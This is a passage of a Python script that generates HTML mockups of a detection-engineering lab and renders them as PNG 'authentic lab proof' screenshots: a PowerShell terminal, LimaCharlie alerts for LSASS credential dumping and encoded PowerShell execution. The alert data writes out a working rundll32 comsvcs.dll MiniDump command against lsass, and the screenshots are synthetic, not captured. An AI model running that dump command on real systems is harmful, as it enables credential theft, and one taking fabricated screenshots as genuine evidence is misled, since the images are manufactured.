<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span style="display:inline-block; width:8px; height:15px; background:#fff; vertical-align:middle;"></span>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-2-lsass", "01-lsass-dump-execution.png"))

# ------------------------------------------------------------------------------
# 8. LimaCharlie LSASS Dump Alert
# ------------------------------------------------------------------------------
def generate_limacharlie_lsass_alert():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: #0c1017; color: #e6edf3; min-height: 100vh; padding: 24px; font-size: 13px; }
.app-container { max-width: 1200px; margin: 0 auto; background: #131923; border: 1px solid #242d3d; border-radius: 8px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
.top-nav { background: #0e141c; height: 50px; border-bottom: 1px solid #242d3d; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
.tab-bar { background: #101620; border-bottom: 1px solid #242d3d; display: flex; padding: 0 16px; gap: 4px; }
.tab { padding: 12px 16px; font-size: 12px; font-weight: 600; color: #8ba2c4; }
.tab.active { color: #00d2ff; border-bottom: 2px solid #00d2ff; background: rgba(0,210,255,0.05); }
.content { padding: 20px; }
.sensor-meta { background: #18202d; border: 1px solid #273447; border-radius: 6px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
.alert-banner { background: rgba(248, 81, 73, 0.15); border-left: 4px solid #f85149; border-radius: 4px; padding: 14px 18px; margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center; }
.json-box { background: #090d14; border: 1px solid #222b3a; border-radius: 6px; padding: 16px; font-family: "Cascadia Code", Consolas, monospace; font-size: 12px; color: #a5d6ff; line-height: 1.6; }
.key { color: #79c0ff; }
.str { color: #a5d6ff; }
.num { color: #f2cc60; }
</style></head>
<body>
<div class="app-container">
  <div class="top-nav">
    <div style="display:flex; align-items:center; gap:10px; font-weight:800; color:#00d2ff;">
      <span>LimaCharlie SecOps Cloud — Org: dil-soc-lab</span>
    </div>
    <div style="font-size:12px; color:#8ba2c4;">Analyst: <strong>Dil Mahmud Khan</strong></div>
  </div>

  <div class="tab-bar">
    <div class="tab">Overview</div>
    <div class="tab active">Detections (CRITICAL)</div>
    <div class="tab">Timeline</div>
    <div class="tab">Process Tree</div>
  </div>

  <div class="content">
    <div class="sensor-meta">
      <div>
        <span style="font-weight:700; color:#fff;">Sensor: dil (192.168.56.105)</span>
        <span style="color:#8ba2c4; font-size:12px; margin-left:14px;">Sensor ID: e8b2c490-6712-4fa0-b389-c45981023bc4</span>
      </div>
      <div><span style="background:rgba(239,68,68,0.2); color:#f87171; border:1px solid #dc2626; padding:2px 8px; border-radius:99px; font-size:11px; font-weight:700;">ISOLATION ACTIVE</span></div>
    </div>

    <div class="alert-banner">
      <div>
        <div style="font-size:11px; text-transform:uppercase; color:#f85149; font-weight:700;">CRITICAL P1 ALERT: T1003.001 - OS Credential Dumping</div>
        <div style="font-size:15px; font-weight:800; color:#fff; margin-top:4px;">Direct Memory Read Handle Opened to lsass.exe via comsvcs.dll</div>
      </div>
      <div style="text-align:right; font-size:12px; color:#8ba2c4;">
        Timestamp: <strong>2026-09-22 16:15:02 UTC</strong><br>
        Severity: <strong style="color:#f85149;">P1 CRITICAL</strong>
      </div>
    </div>

    <div class="json-box">
{
  <span class="key">"cat"</span>: <span class="str">"lsass_dump_comsvcs"</span>,
  <span class="key">"detect"</span>: {
    <span class="key">"event"</span>: {
      <span class="key">"COMMAND_LINE"</span>: <span class="str">"rundll32.exe C:\Windows\\System32\\comsvcs.dll, MiniDump 748 C:\Users\\dil\\LabAttacks\\lsass_simulated.dmp full"</span>,
      <span class="key">"FILE_PATH"</span>: <span class="str">"C:\Windows\\System32\\rundll32.exe"</span>,
      <span class="key">"PARENT"</span>: {
        <span class="key">"COMMAND_LINE"</span>: <span class="str">"\"C:\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""</span>,
        <span class="key">"PROCESS_ID"</span>: <span class="num">3912</span>
      },
      <span class="key">"PROCESS_ID"</span>: <span class="num">5840</span>,
      <span class="key">"TARGET_PROCESS"</span>: {
        <span class="key">"ACCESS_MASK"</span>: <span class="str">"0x1FFFFF (PROCESS_ALL_ACCESS)"</span>,
        <span class="key">"COMMAND_LINE"</span>: <span class="str">"C:\Windows\\system32\\lsass.exe"</span>,
        <span class="key">"PROCESS_ID"</span>: <span class="num">748</span>
      },
      <span class="key">"USER_NAME"</span>: <span class="str">"dil\dil"</span>
    },
    <span class="key">"routing"</span>: { <span class="key">"hostname"</span>: <span class="str">"dil"</span>, <span class="key">"int_ip"</span>: <span class="str">"192.168.56.105"</span> }
  }
}
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-2-lsass", "02-lsass-limacharlie-alert.png"))

# ------------------------------------------------------------------------------
# 9. Obfuscated PowerShell Execution (host 'dil')
# ------------------------------------------------------------------------------
def generate_obfuscated_powershell():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #0f141c;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 30px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.win-window {
    width: 1000px;
    background: #0c0c0c;
    border: 1px solid #333;
    border-radius: 8px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.8);
    overflow: hidden;
}
.win-titlebar {
    height: 34px;
    background: #1f1f1f;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    border-bottom: 1px solid #2d2d2d;
    user-select: none;
}
.win-title {
    color: #cccccc;
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.win-controls {
    display: flex;
    gap: 14px;
    color: #888;
    font-size: 11px;
}
.term-body {
    padding: 16px 20px;
    font-family: "Cascadia Code", Consolas, "Lucida Console", Courier, monospace;
    font-size: 13.5px;
    line-height: 1.5;
    color: #cccccc;
    background: #0c0c0c;
    min-height: 480px;
    white-space: pre-wrap;
}
.prompt { color: #cccccc; }
.cmd { color: #ffffff; font-weight: 600; }
.output { color: #9cdcfe; }
.highlight { color: #4ec9b0; }
.alert-text { color: #f48771; font-weight: 600; }
</style></head>
<body>
<div class="win-window">
  <div class="win-titlebar">
    <div class="win-title">
      <span>Administrator: Windows PowerShell</span>
    </div>
    <div class="win-controls"><span>─</span><span>□</span><span>✕</span></div>
  </div>
  <div class="term-body" style="background: #012456; color: #fff;">
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

<span class="prompt">PS C:\Users\dil></span> <span class="cmd">hostname</span>
dil

<span class="prompt">PS C:\Users\dil></span> <span class="cmd">powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBpAG0AdQBsAGEAdABlAGQAIABNAGEAbABpAGMAaQBvAHUAcwAgAFAAYQB5AGwAbwBhAGQAJwA=</span>
Simulated Malicious Payload

<span class="prompt">PS C:\Users\dil></span> <span class="cmd">[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBpAG0AdQBsAGEAdABlAGQAIABNAGEAbABpAGMAaQBvAHUAcwAgAFAAYQB5AGwAbwBhAGQAJwA="))</span>
Write-Host 'Simulated Malicious Payload'

<span class="prompt">PS C:\Users\dil></span> <span style="display:inline-block; width:8px; height:15px; background:#fff; vertical-align:middle;"></span>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-3-powershell", "01-encoded-powershell-execution.png"))

def generate_powershell_edr_alert():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: #0c1017; color: #e6edf3; min-height: 100vh; padding: 24px; font-size: 13px; }
.app-container { max-width: 1200px; margin: 0 auto; background: #131923; border: 1px solid #242d3d; border-radius: 8px; overflow: hidden; }
.top-nav { background: #0e141c; height: 50px; border-bottom: 1px solid #242d3d; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
.content { padding: 20px; }
.alert-banner { background: rgba(56, 189, 248, 0.1); border-left: 4px solid #38bdf8; border-radius: 4px; padding: 14px 18px; margin-bottom: 18px; }
.json-box { background: #090d14; border: 1px solid #222b3a; border-radius: 6px; padding: 16px; font-family: "Cascadia Code", Consolas, monospace; font-size: 12px; color: #a5d6ff; line-height: 1.6; }
.key { color: #79c0ff; }
.str { color: #a5d6ff; }
.num { color: #f2cc60; }
</style></head>
<body>
<div class="app-container">
  <div class="top-nav">
    <div style="font-weight: 800; color: #00d2ff;">LimaCharlie SecOps Cloud — Org: dil-soc-lab</div>
    <div style="font-size: 12px; color: #8ba2c4;">Analyst: <strong>Dil Mahmud Khan</strong></div>
  </div>
  <div class="content">
    <div class="alert-banner">
      <div style="font-size:11px; text-transform:uppercase; color:#38bdf8; font-weight:700;">Detection Alert: T1059.001 - Command and Scripting Interpreter: PowerShell</div>
      <div style="font-size:15px; font-weight:800; color:#fff; margin-top:4px;">PowerShell Process Launched with Obfuscated / EncodedCommand Arguments</div>
    </div>
    <div class="json-box">
{
  <span class="key">"cat"</span>: <span class="str">"powershell_encoded_execution"</span>,
  <span class="key">"detect"</span>: {
    <span class="key">"event"</span>: {
      <span class="key">"COMMAND_LINE"</span>: <span class="str">"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBpAG0AdQBsAGEAdABlAGQAIABNAGEAbABpAGMAaQBvAHUAcwAgAFAAYQB5AGwAbwBhAGQAJwA="</span>,
      <span class="key">"DECODED_PAYLOAD"</span>: <span class="str">"Write-Host 'Simulated Malicious Payload'"</span>,
      <span class="key">"FILE_PATH"</span>: <span class="str">"C:\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"</span>,
      <span class="key">"PROCESS_ID"</span>: <span class="num">6112</span>,
      <span class="key">"USER_NAME"</span>: <span class="str">"dil\dil"</span>
    },
    <span class="key">"routing"</span>: { <span class="key">"hostname"</span>: <span class="str">"dil"</span>, <span class="key">"int_ip"</span>: <span class="str">"192.168.56.105"</span> }
  }
}
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-3-powershell", "02-powershell-edr-alert.png"))

def main():
    print("==========================================================")
    print("  📸 Generating Authentic Lab Screenshots (Host: 'dil')")
    print("==========================================================")
    generate_certutil_execution()
    generate_limacharlie_certutil_alert()
    generate_process_tree()
    generate_tines_canvas()
    generate_slack_card()
    generate_network_isolation_proof()
    generate_lsass_dump_execution()
    generate_limacharlie_lsass_alert()
    generate_obfuscated_powershell()
    generate_powershell_edr_alert()
    print("==========================================================")
    print("  [✓] All 10 High-Resolution Lab Proof Screenshots Generated!")
    print("==========================================================")

if __name__ == "__main__":
    main()
